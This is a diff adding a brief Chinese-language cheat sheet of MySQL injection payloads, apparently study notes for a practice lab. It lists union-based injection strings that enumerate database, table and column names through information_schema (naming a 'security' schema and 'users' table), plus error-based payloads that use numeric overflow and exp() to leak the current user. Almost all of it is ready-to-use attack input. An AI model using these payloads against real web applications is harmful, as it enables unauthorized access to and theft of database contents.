@@ -1,0 +1,12 @@
+
+联合注入:
+	test ' union select 1,2,{},4 #
+	库名 group_concat(SCHEMA_NAME) from information_schema.SCHEMATA
+	表名 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security')
+	列名 union select 1,(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users'),3%23
+	
+	
+报错注入:
+	溢出报错 18446744073709551615+1  ; ~0 + 1 ; exp(709+1)
+	返回报错信息 exp(~(select*from(select user())x))
+ 
